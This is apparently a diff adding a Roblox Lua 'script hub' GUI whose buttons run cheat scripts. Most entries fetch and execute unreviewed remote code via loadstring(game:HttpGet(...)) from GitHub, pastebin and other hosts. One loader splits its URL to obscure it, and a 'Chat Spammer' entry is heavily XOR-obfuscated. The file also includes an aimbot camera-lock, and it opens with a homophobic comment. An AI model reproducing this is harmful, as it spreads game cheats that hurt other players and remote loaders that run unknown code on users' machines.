@@ -1,0 +1,1025 @@
+-- Why are you gay! 
+
+
+
+local ScreenGui = Instance.new("ScreenGui")
+
+local ToggleButton = Instance.new("TextButton")
+
+local MainFrame = Instance.new("Frame")
+
+local ScrollFrame = Instance.new("ScrollingFrame")
+
+local WelcomeLabel = Instance.new("TextLabel")
+
+local CreditsLabel = Instance.new("TextLabel")
+
+local UIStroke = Instance.new("UIStroke")
+
+local UICorner = Instance.new("UICorner")
+
+local UIGradient = Instance.new("UIGradient")
+
+
+
+-- Sound Effects
+
+local HoverSound = Instance.new("Sound")
+
+HoverSound.SoundId = "rbxassetid://9114454769"
+
+HoverSound.Volume = 0.5
+
+HoverSound.Parent = ScreenGui
+
+
+
+local ClickSound = Instance.new("Sound")
+
+ClickSound.SoundId = "rbxassetid://452267918"
+
+ClickSound.Volume = 0.7
+
+ClickSound.Parent = ScreenGui
+
+
+
+-- Parent Setup
+
+ScreenGui.Name = "CleanScriptHub"
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+ScreenGui.ResetOnSpawn = false
+
+
+
+-- Toggle Button
+
+ToggleButton.Name = "ToggleButton"
+
+ToggleButton.Parent = ScreenGui
+
+ToggleButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+
+ToggleButton.Position = UDim2.new(0, 10, 0.5, -25)
+
+ToggleButton.Size = UDim2.new(0, 100, 0, 50)
+
+ToggleButton.Text = "Toggle UI"
+
+ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+ToggleButton.Font = Enum.Font.GothamBold
+
+ToggleButton.TextSize = 14
+
+ToggleButton.Active = true
+
+ToggleButton.Draggable = true
+
+
+
+UICorner:Clone().Parent = ToggleButton
+
+UIStroke:Clone().Parent = ToggleButton
+
+
+
+-- Main Frame
+
+MainFrame.Name = "MainFrame"
+
+MainFrame.Parent = ScreenGui
+
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+
+MainFrame.BackgroundTransparency = 0.2
+
+MainFrame.Position = UDim2.new(0.5, -150, 0.5, -120)
+
+MainFrame.Size = UDim2.new(0, 300, 0, 240)
+
+MainFrame.Visible = true
+
+
+
+UIGradient.Color = ColorSequence.new({
+
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 25)),
+
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 40, 40))
+
+})
+
+UIGradient.Rotation = 45
+
+UIGradient.Parent = MainFrame
+
+
+
+UICorner:Clone().Parent = MainFrame
+
+UIStroke.Parent = MainFrame
+
+UIStroke.Color = Color3.fromRGB(100, 100, 100)
+
+UIStroke.Thickness = 2
+
+
+
+-- Scroll Frame
+
+ScrollFrame.Name = "ScrollFrame"
+
+ScrollFrame.Parent = MainFrame
+
+ScrollFrame.BackgroundTransparency = 1
+
+ScrollFrame.Size = UDim2.new(1, -10, 1, -40)
+
+ScrollFrame.Position = UDim2.new(0, 5, 0, 30)
+
+ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 600)
+
+ScrollFrame.ScrollBarThickness = 6
+
+
+
+-- Welcome Label
+
+WelcomeLabel.Parent = ScrollFrame
+
+WelcomeLabel.BackgroundTransparency = 1
+
+WelcomeLabel.Position = UDim2.new(0, 0, 0, 10)
+
+WelcomeLabel.Size = UDim2.new(1, 0, 0, 30)
+
+WelcomeLabel.Text = "Welcome, " .. game.Players.LocalPlayer.Name
+
+WelcomeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+WelcomeLabel.Font = Enum.Font.GothamBold
+
+WelcomeLabel.TextSize = 24
+
+WelcomeLabel.TextTransparency = 0
+
+
+
+-- Credits Label
+
+CreditsLabel.Parent = ScrollFrame
+
+CreditsLabel.BackgroundTransparency = 1
+
+CreditsLabel.Position = UDim2.new(0, 0, 0, 40)
+
+CreditsLabel.Size = UDim2.new(1, 0, 0, 20)
+
+CreditsLabel.Text = "CREDITS BY JAMAL_HYROX"
+
+CreditsLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+
+CreditsLabel.Font = Enum.Font.Gotham
+
+CreditsLabel.TextSize = 14
+
+
+
+-- Button Creation Function
+
+local function createScriptButton(name, scriptContent, parent, position)
+
+    local button = Instance.new("TextButton")
+
+    button.Name = name
+
+    button.Size = UDim2.new(0.3, 0, 0, 40)
+
+    button.Position = position
+
+    button.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+    button.Text = name
+
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+    button.Font = Enum.Font.GothamBold
+
+    button.TextSize = 12
+
+    button.AutoButtonColor = false
+
+    button.Parent = parent
+
+
+
+    local uiCorner = UICorner:Clone()
+
+    uiCorner.Parent = button
+
+
+
+    local uiStroke = UIStroke:Clone()
+
+    uiStroke.Parent = button
+
+
+
+    -- Hover Effects
+
+    button.MouseEnter:Connect(function()
+
+        button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+
+        HoverSound:Play()
+
+    end)
+
+
+
+    button.MouseLeave:Connect(function()
+
+        button.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+    end)
+
+
+
+    -- Click Effect
+
+    button.MouseButton1Click:Connect(function()
+
+        ClickSound:Play()
+
+        pcall(function()
+
+            loadstring(scriptContent)()
+
+        end)
+
+    end)
+
+
+
+    return button
+
+end
+
+
+
+-- Add Scripts
+
+local scripts = {
+
+    {name = "Silent Aim (Paid)", script = [[getgenv().Loader = "Killbot"
+
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/BagasDribble/LuarmorK/main/Main%20Loader"))()]]},
+
+
+
+    {name = "CamLock (Paid)", script = [[local Players = game:GetService("Players")
+
+local RunService = game:GetService("RunService")
+
+local UserInputService = game:GetService("UserInputService")
+
+
+
+local LocalPlayer = Players.LocalPlayer
+
+local Camera = workspace.CurrentCamera
+
+
+
+-- Prediction Settings
+
+local prediction = 0.145 -- tweak this if needed depending on ping
+
+
+
+-- GUI
+
+local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+
+ScreenGui.Name = "CamLockGUI"
+
+ScreenGui.ResetOnSpawn = false
+
+
+
+local Button = Instance.new("TextButton")
+
+Button.Parent = ScreenGui
+
+Button.Size = UDim2.new(0, 140, 0, 45)
+
+Button.Position = UDim2.new(0, 20, 0, 100)
+
+Button.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
+
+Button.TextColor3 = Color3.new(1, 1, 1)
+
+Button.Font = Enum.Font.SourceSansBold
+
+Button.TextSize = 18
+
+Button.Text = "Lock Camera"
+
+Button.ZIndex = 1000
+
+
+
+local corner = Instance.new("UICorner", Button)
+
+corner.CornerRadius = UDim.new(0, 12)
+
+
+
+-- Draggable
+
+local dragging, dragInput, dragStart, startPos
+
+
+
+Button.InputBegan:Connect(function(input)
+
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+
+		dragging = true
+
+		dragStart = input.Position
+
+		startPos = Button.Position
+
+
+
+		input.Changed:Connect(function()
+
+			if input.UserInputState == Enum.UserInputState.End then
+
+				dragging = false
+
+			end
+
+		end)
+
+	end
+
+end)
+
+
+
+Button.InputChanged:Connect(function(input)
+
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+
+		dragInput = input
+
+	end
+
+end)
+
+
+
+UserInputService.InputChanged:Connect(function(input)
+
+	if input == dragInput and dragging then
+
+		local delta = input.Position - dragStart
+
+		Button.Position = UDim2.new(
+
+			startPos.X.Scale, startPos.X.Offset + delta.X,
+
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y
+
+		)
+
+	end
+
+end)
+
+
+
+-- Lock Logic
+
+local Locking = false
+
+local Target = nil
+
+
+
+local function getClosestPlayer()
+
+	local closestPlayer = nil
+
+	local shortestDistance = math.huge
+
+
+
+	for _, player in ipairs(Players:GetPlayers()) do
+
+		if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Head") then
+
+			local pos, onScreen = Camera:WorldToViewportPoint(player.Character.Head.Position)
+
+			if onScreen then
+
+				local screenCenter = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
+
+				local distance = (Vector2.new(pos.X, pos.Y) - screenCenter).Magnitude
+
+				if distance < shortestDistance then
+
+					shortestDistance = distance
+
+					closestPlayer = player
+
+				end
+
+			end
+
+		end
+
+	end
+
+
+
+	return closestPlayer
+
+end
+
+
+
+Button.MouseButton1Click:Connect(function()
+
+	Locking = not Locking
+
+	if Locking then
+
+		Target = getClosestPlayer()
+
+		Button.Text = "Unlock Camera"
+
+	else
+
+		Target = nil
+
+		Button.Text = "Lock Camera"
+
+	end
+
+end)
+
+
+
+RunService.RenderStepped:Connect(function()
+
+	if Locking and Target and Target.Character and Target.Character:FindFirstChild("Head") then
+
+		local head = Target.Character.Head
+
+		local velocity = head.Velocity * prediction
+
+		local predictedPosition = head.Position + velocity
+
+		Camera.CFrame = CFrame.new(Camera.CFrame.Position, predictedPosition)
+
+	end
+
+end)]]},
+
+
+
+    {name = "Fake Rblx Client", script = [[-- Fake Korblox for Both Legs (Client-Sided)
+
+local player = game.Players.LocalPlayer
+
+local character = player.Character or player.CharacterAdded:Wait()
+
+
+
+-- Wait for character to fully load
+
+repeat wait() until character:FindFirstChild("Humanoid")
+
+
+
+local function applyKorbloxBothLegs()
+
+	local isR15 = character:FindFirstChild("RightLowerLeg") ~= nil
+
+
+
+	if isR15 then
+
+		-- R15 Rig: Hide both lower legs and feet
+
+		local partsToHide = {
+
+			"RightLowerLeg", "RightFoot",
+
+			"LeftLowerLeg", "LeftFoot"
+
+		}
+
+
+
+		for _, partName in ipairs(partsToHide) do
+
+			local part = character:FindFirstChild(partName)
+
+			if part then
+
+				part.Transparency = 1
+
+				if part:FindFirstChild("Mesh") then
+
+					part.Mesh:Destroy()
+
+				end
+
+			end
+
+		end
+
+	else
+
+		-- R6 Rig: Replace both legs with Korblox mesh
+
+		local rightLeg = character:FindFirstChild("Right Leg")
+
+		local leftLeg = character:FindFirstChild("Left Leg")
+
+
+
+		if rightLeg then
+
+			rightLeg.MeshId = "902942093"
+
+			rightLeg.TextureID = "http://roblox.com/asset/?id=902843398"
+
+		end
+
+
+
+		if leftLeg then
+
+			leftLeg.MeshId = "902942093"
+
+			leftLeg.TextureID = "http://roblox.com/asset/?id=902843398"
+
+		end
+
+	end
+
+end
+
+
+
+applyKorbloxBothLegs()]]},
+
+
+
+    {name = "Q Tool", script = [[getgenv().keytoclick = "Q"
+
+tool = Instance.new("Tool")
+
+tool.RequiresHandle = false
+
+tool.Name = keytoclick
+
+tool.Activated:connect(function()
+
+    local vim = game:service("VirtualInputManager")
+
+vim:SendKeyEvent(true, keytoclick, false, game)
+
+end)
+
+tool.Parent = game.Players.LocalPlayer.Backpack
+
+
+
+game.StarterGui:SetCore("SendNotification", {
+
+    Title = "scooby#1234";
+
+    Text = "join .gg/dotlock for more kids";
+
+
+
+})
+
+
+
+local player = game.Players.LocalPlayer
+
+
+
+local function connectCharacterAdded()
+
+    player.CharacterAdded:Connect(onCharacterAdded)
+
+end
+
+
+
+connectCharacterAdded()
+
+
+
+player.CharacterRemoving:Connect(function()
+
+    tool.Parent = game.Players.LocalPlayer.Backpack
+
+end)]]},
+
+
+
+    {name = "Fire Parts", script = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/EnesXVC/FireParts/main/Script"))()]]},
+
+
+
+    {name = "Anti Lock", script = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/Gwaporoblox/Sub-to-vascal/main/Vascal-antilock-button"))()]]},
+
+
+
+    {name = "Flashback", script = [[loadstring(game:HttpGet("https://mscripts.vercel.app/scfiles/reverse-script.lua"))()]]},
+
+
+
+    {name = "Da Hood CamLock", script = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/DaddyFelixFucks/EgoV3/refs/heads/main/EgoV3Taps", true))()]]},
+
+
+
+    {name = "FPS Shower", script = [[-- Services
+
+local RunService = game:GetService("RunService")
+
+local Stats = game:GetService("Stats")
+
+local Players = game:GetService("Players")
+
+local LocalPlayer = Players.LocalPlayer
+
+local StarterGui = game:GetService("StarterGui")
+
+
+
+-- Create GUI
+
+local ScreenGui = Instance.new("ScreenGui")
+
+ScreenGui.Name = "FPS_Ping_Display"
+
+ScreenGui.Parent = game:GetService("CoreGui")
+
+
+
+local Frame = Instance.new("Frame")
+
+Frame.Size = UDim2.new(0, 200, 0, 80)
+
+Frame.Position = UDim2.new(0.7, 0, 0.05, 0)
+
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+
+Frame.BackgroundTransparency = 0.3
+
+Frame.BorderSizePixel = 2
+
+Frame.Parent = ScreenGui
+
+Frame.Active = true
+
+Frame.Draggable = true -- Makes the GUI movable
+
+
+
+local TitleLabel = Instance.new("TextLabel")
+
+TitleLabel.Size = UDim2.new(1, 0, 0.3, 0)
+
+TitleLabel.Position = UDim2.new(0, 0, 0, 0)
+
+TitleLabel.BackgroundTransparency = 1
+
+TitleLabel.Text = "FPS & Ping counter"
+
+TitleLabel.Font = Enum.Font.SourceSansBold
+
+TitleLabel.TextSize = 16
+
+TitleLabel.TextColor3 = Color3.new(1, 1, 1)
+
+TitleLabel.Parent = Frame
+
+
+
+local FPSText = Instance.new("TextLabel")
+
+FPSText.Size = UDim2.new(1, 0, 0.35, 0)
+
+FPSText.Position = UDim2.new(0, 0, 0.3, 0)
+
+FPSText.BackgroundTransparency = 1
+
+FPSText.Font = Enum.Font.SourceSansBold
+
+FPSText.TextSize = 16
+
+FPSText.TextColor3 = Color3.new(1, 1, 1)
+
+FPSText.Parent = Frame
+
+
+
+local PingText = Instance.new("TextLabel")
+
+PingText.Size = UDim2.new(1, 0, 0.35, 0)
+
+PingText.Position = UDim2.new(0, 0, 0.65, 0)
+
+PingText.BackgroundTransparency = 1
+
+PingText.Font = Enum.Font.SourceSansBold
+
+PingText.TextSize = 16
+
+PingText.TextColor3 = Color3.new(1, 1, 1)
+
+PingText.Parent = Frame
+
+
+
+-- Send a welcoming notification to the player
+
+StarterGui:SetCore("SendNotification", {
+
+    Title = "Yippee!",
+
+    Text = "Thanks you for choosing this script!",
+
+    Icon = "rbxassetid://15652789465", -- New icon ID
+
+    Duration = 5
+
+})
+
+
+
+-- Update FPS & Ping every second
+
+task.spawn(function()
+
+    while true do
+
+        -- FPS Calculation
+
+        local fps = math.floor(1 / RunService.RenderStepped:Wait())
+
+
+
+        -- Ping Calculation
+
+        local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+
+
+
+        -- FPS Rating
+
+        local fpsRating = (fps > 60 and "Excellent (Ultra Smooth)") or 
+
+                          (fps >= 30 and "Playable") or 
+
+                          "Choppy (Bad)"
+
+
+
+        -- Ping Rating
+
+        local pingRating = (ping <= 50 and "Good") or 
+
+                           (ping <= 100 and "Decent") or 
+
+                           "Bad (High Ping)"
+
+
+
+        -- Update GUI Text
+
+        FPSText.Text = "FPS: " .. fps .. " (" .. fpsRating .. ")"
+
+        PingText.Text = "Ping: " .. ping .. "ms (" .. pingRating .. ")"
+
+
+
+        task.wait(1) -- Update every second
+
+    end
+
+end)]]},
+
+
+
+    {name = "BABFT", script = [[loadstring(game:HttpGet("https://rawscripts.net/raw/Build-A-Boat-For-Treasure-BBFT-Script-24996"))()]]},
+
+
+
+    {name = "Admin Panel", script = [[-- https://scriptblox.com/script/Universal-Script-rochips-panel-34286
+
+
+
+if "you wanna use rochips universal" then
+
+    local z_x,z_z="gzrux646yj/raw/main.ts","https://glot.io/snippets/"
+
+    local im,lonely,z_c=task.wait,game,loadstring
+
+    z_c(lonely:HttpGet(z_z..""..z_x))()
+
+    return ("This will load in about 2 - 30 seconds" or "according to your device and executor")
+
+end]]},
+
+
+
+    {name = "ShiftLock", script = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/prosadaf/Example/refs/heads/main/Video"))()]]},
+
+
+
+    {name = "Chat Spammer", script = [[-- https://scriptblox.com/script/Universal-Script-Macro-chat-30115
+
+
+
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v58,v59) local v60={};for v87=1, #v58 do v6(v60,v0(v4(v1(v2(v58,v87,v87 + 1 )),v1(v2(v59,1 + (v87% #v59) ,1 + (v87% #v59) + 1 )))%256 ));end return v5(v60);end local v8=game:GetService(v7("\229\198\195\49\197\179\198\10\226\198\201\51\239\184\194","\126\177\163\187\69\134\219\167"));local v9=game:GetService(v7("\19\193\43\220\249\49\222","\156\67\173\74\165"));local v10=game:GetService(v7("\23\191\72\2","\38\84\215\41\118\220\70"));local v11=game:GetService(v7("\101\5\39\0\215\94\6\55\6\205\85\4\52\27\253\85","\158\48\118\66\114"));local function v12(v61) local v62=v7("\138\6\51\18\86\131\220\131\13\58\29\95\136\213\132\20\33\4\64\145\206\157\19\40\15\73\164\249\168\32\21\48\116\173\242\161\47\28\59\125\170\235\186\54\3\34\102\179\236\179\61\10\102\34\247\168\255\113\70\97\43\252","\155\203\68\112\86\19\197");local v63="";for v88=1,v61 do local v89=0;local v90;while true do if (v89==0) then v90=math.random(2 -1 , #v62);v63=v63   .. v62:sub(v90,v90) ;break;end end end return v63;end local function v13() for v91=1,7 -5  do local v92=0 -0 ;local v93;while true do if (v92==(0 -0)) then v93=v12(math.random(118 -38 ,83 + 7 ));game.Players:Chat(v7("\71\211\34\245\0\108\228\255\85\157\63\241\0\107\234\234\84\196\118\250\79\106\165\236\78\216\118\239\80\121\232\184\11\157","\152\38\189\86\156\32\24\133")   .. v93 );break;end end end end local v14=v9.LocalPlayer;local v15=v7("\239\86\177\67\248\104\170\67\239\68\166\65\249\68\233\82\228\67","\38\156\55\199");local v16=Instance.new(v7("\155\126\110\45\22\122\221\86\161","\35\200\29\28\72\115\20\154"));v16.Parent=v14:WaitForChild(v7("\41\179\208\198\136\62\19\12\182","\84\121\223\177\191\237\76"));local v18=Instance.new(v7("\157\68\200\173\63","\161\219\54\169\192\90\48\80"));v18.Size=UDim2.new(0 -0 ,273 + 27 ,0,200);v18.Position=UDim2.new(0.5, -(339 -189),1413.5 -(447 + 966) , -100);v18.BackgroundColor3=Color3.fromRGB(136 -86 ,50,1867 -(1703 + 114) );v18.Active=true;v18.Parent=v16;local v24=Instance.new(v7("\125\71\24\49\107\77\24","\69\41\34\96"));v24.Size=UDim2.new(702 -(376 + 325) , -(16 -6),0 -0 ,9 + 21 );v24.Position=UDim2.new(0 -0 ,19 -(9 + 5) ,376 -(85 + 291) ,5);v24.PlaceholderText=v7("\136\218\199\15\66\42\252\206\210\25\17\42\187\198\153\68\76","\75\220\163\183\106\98");v24.BackgroundColor3=Color3.fromRGB(255,1520 -(243 + 1022) ,970 -715 );v24.Text="";v24.Parent=v18;local v31=Instance.new(v7("\54\191\147\35\251\23\174\159\56\215","\185\98\218\235\87"));v31.Size=UDim2.new(1 + 0 , -(1190 -(1123 + 57)),0,25 + 5 );v31.Position=UDim2.new(254 -(163 + 91) ,1935 -(1869 + 61) ,0 + 0 ,40);v31.Text=v7("\248\41\37\235\215\190","\202\171\92\71\134\190");v31.BackgroundColor3=Color3.fromRGB(352 -252 ,153 -53 ,35 + 220 );v31.Parent=v18;local v37=Instance.new(v7("\26\194\62\135\37\205\37\134\46\231\62\137\36\196","\232\73\161\76"));v37.Size=UDim2.new(1 -0 , -(10 + 0),1, -(1554 -(1329 + 145)));v37.Position=UDim2.new(971 -(140 + 831) ,1855 -(1409 + 441) ,718 -(15 + 703) ,35 + 40 );v37.CanvasSize=UDim2.new(438 -(262 + 176) ,1721 -(345 + 1376) ,688 -(198 + 490) ,0 -0 );v37.BackgroundColor3=Color3.fromRGB(71 -41 ,1236 -(696 + 510) ,62 -32 );v37.ScrollBarThickness=1268 -(1091 + 171) ;v37.Parent=v18;local v44=Instance.new(v7("\142\240\110\84\13\175\245\67\68\17\174\205","\126\219\185\34\61"));v44.Parent=v37;v44.SortOrder=Enum.SortOrder.LayoutOrder;local function v48(v64) local v65=0 + 0 ;while true do if (v65==0) then for v112,v113 in utf8.codes(v64) do if (((v113>=(25790 -17598)) and (v113<=(27697 -19345))) or (v113==(65653 -(123 + 251)))) then return true;end end return false;end end end local function v49(v66) local v67=0;local v68;while true do if (v67==0) then v68=table.concat(v66,"\n");pcall(function() writefile(v15,v68);end);break;end end end local function v50(v69,v70) local v71=0 -0 ;local v72;local v73;local v74;while true do if (2==v71) then v73.BackgroundColor3=Color3.fromRGB(200,200,898 -(208 + 490) );v73.Parent=v72;v73.MouseButton1Click:Connect(function() v13();if v8.ChatInputBarConfiguration.TargetTextChannel then v8.ChatInputBarConfiguration.TargetTextChannel:SendAsync(v69);end end);v74=Instance.new(v7("\191\245\42\73\218\178\159\228\61\83","\199\235\144\82\61\152"));v71=1 + 2 ;end if (v71==(0 + 0)) then v72=Instance.new(v7("\42\220\95\127\123","\135\108\174\62\18\30\23\147"));v72.Size=UDim2.new(1,0,836 -(660 + 176) ,4 + 26 );v72.BackgroundTransparency=203 -(14 + 188) ;v72.Parent=v37;v71=1;end if ((679 -(534 + 141))==v71) then v74.BackgroundColor3=Color3.fromRGB(103 + 152 ,45 + 5 ,49 + 1 );v74.Parent=v72;v74.MouseButton1Click:Connect(function() v72:Destroy();for v114,v115 in ipairs(v70) do if (v115==v69) then table.remove(v70,v114);break;end end v49(v70);end);v37.CanvasSize=UDim2.new(0,0 -0 ,0 -0 ,v44.AbsoluteContentSize.Y + (28 -18) );break;end if (1==v71) then v73=Instance.new(v7("\130\236\50\223\58\187\39\211\185\231","\167\214\137\74\171\120\206\83"));v73.Size=UDim2.new(0.8, -(3 + 2),1,0);v73.Position=UDim2.new(0 + 0 ,396 -(115 + 281) ,0 -0 ,0 + 0 );v73.Text=v69;v71=4 -2 ;end if (v71==3) then v74.Size=UDim2.new(0.2 -0 ,867 -(550 + 317) ,1 -0 ,0);v74.Position=UDim2.new(0.8,7 -2 ,0,0 -0 );v74.Text="X";v74.TextColor3=Color3.fromRGB(255,255,540 -(134 + 151) );v71=1669 -(970 + 695) ;end end end local function v51() local v75=0;local v76;local v77;local v78;while true do if (v75==1) then if (v77 and v78) then for v122,v123 in ipairs(string.split(v78,"\n")) do if (v123~="") then table.insert(v76,v123);v50(v123,v76);end end end return v76;end if (v75==(0 -0)) then v76={};v77,v78=pcall(function() return readfile(v15);end);v75=1;end end end local v52=v51();v31.MouseButton1Click:Connect(function() local v79=0;local v80;while true do if (v79==(1990 -(582 + 1408))) then v80=v24.Text;if (v80~="") then local v116=v48(v80);local v117,v118=pcall(function() return (v116 and v80) or v10:FilterStringAsync(v80,v14,v14) ;end);v24.Text="";if (v117 and v118 and  not v118:match(v7("\57\85\242\111","\75\103\118\217"))) then local v124=0;while true do if (v124==(3 -2)) then v49(v52);break;end if (v124==(0 -0)) then table.insert(v52,v118);v50(v118,v52);v124=3 -2 ;end end end end break;end end end);local v53,v54,v55,v56;local function v57(v81) local v82=1824 -(1195 + 629) ;local v83;while true do if ((0 -0)==v82) then v83=v81.Position-v55 ;v18.Position=UDim2.new(v56.X.Scale,v56.X.Offset + v83.X ,v56.Y.Scale,v56.Y.Offset + v83.Y );break;end end end v18.InputBegan:Connect(function(v84) if ((v84.UserInputType==Enum.UserInputType.MouseButton1) or (v84.UserInputType==Enum.UserInputType.Touch)) then local v94=0;while true do if (v94==(242 -(187 + 54))) then v56=v18.Position;v84.Changed:Connect(function() if (v84.UserInputState==Enum.UserInputState.End) then v53=false;end end);break;end if (v94==0) then v53=true;v55=v84.Position;v94=781 -(162 + 618) ;end end end end);v18.InputChanged:Connect(function(v85) if ((v85.UserInputType==Enum.UserInputType.MouseMovement) or (v85.UserInputType==Enum.UserInputType.Touch)) then v54=v85;end end);v11.InputChanged:Connect(function(v86) if ((v86==v54) and v53) then v57(v86);end end);]]},
+
+
+
+    {name = "Fly V3", script = [[loadstring(game:HttpGet("https://pastebin.com/raw/KZhWuaEz"))()]]},
+
+
+
+    {name = "GhostHub", script = [[loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()]]}
+
+}
+
+
+
+-- Scripts Grid Layout
+
+local row = 0
+
+local col = 0
+
+for i, scriptInfo in ipairs(scripts) do
+
+    local position = UDim2.new(col * 0.33, 5, 0, row * 45 + 70)
+
+    createScriptButton(scriptInfo.name, scriptInfo.script, ScrollFrame, position)
+
+
+
+    col = col + 1
+
+    if col >= 3 then
+
+        col = 0
+
+        row = row + 1
+
+    end
+
+end
+
+
+
+-- Welcome Fade
+
+task.delay(5, function()
+
+    for i = 0, 1, 0.1 do
+
+        WelcomeLabel.TextTransparency = i
+
+        task.wait(0.05)
+
+    end
+
+    WelcomeLabel.Visible = false
+
+end)
+
+
+
+-- Toggle Logic
+
+ToggleButton.MouseButton1Click:Connect(function()
+
+    ClickSound:Play()
+
+    if MainFrame.Visible then
+
+        for i = 0, 1, 0.1 do
+
+            MainFrame.BackgroundTransparency = i
+
+            task.wait(0.02)
+
+        end
+
+        MainFrame.Visible = false
+
+    else
+
+        MainFrame.Visible = true
+
+        MainFrame.BackgroundTransparency = 1
+
+        for i = 1, 0, -0.1 do
+
+            MainFrame.BackgroundTransparency = i
+
+            task.wait(0.02)
+
+        end
+
+        MainFrame.BackgroundTransparency = 0.2
+
+    end
+
+end)
+
+
+
+-- Draggable Function
+
+local function makeDraggable(frame)
+
+    local dragging, dragInput, dragStart, startPos
+
+
+
+    frame.InputBegan:Connect(function(input)
+
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+
+            dragging = true
+
+            dragStart = input.Position
+
+            startPos = frame.Position
+
+        end
+
+    end)
+
+
+
+    frame.InputChanged:Connect(function(input)
+
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+
+            local delta = input.Position - dragStart
+
+            frame.Position = UDim2.new(
+
+                startPos.X.Scale,
+
+                startPos.X.Offset + delta.X,
+
+                startPos.Y.Scale,
+
+                startPos.Y.Offset + delta.Y
+
+            )
+
+        end
+
+    end)
+
+
+
+    game:GetService("UserInputService").InputEnded:Connect(function(input)
+
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+
+            dragging = false
+
+        end
+
+    end)
+
+end
+
+
+
+makeDraggable(MainFrame)
+
+makeDraggable(ToggleButton)
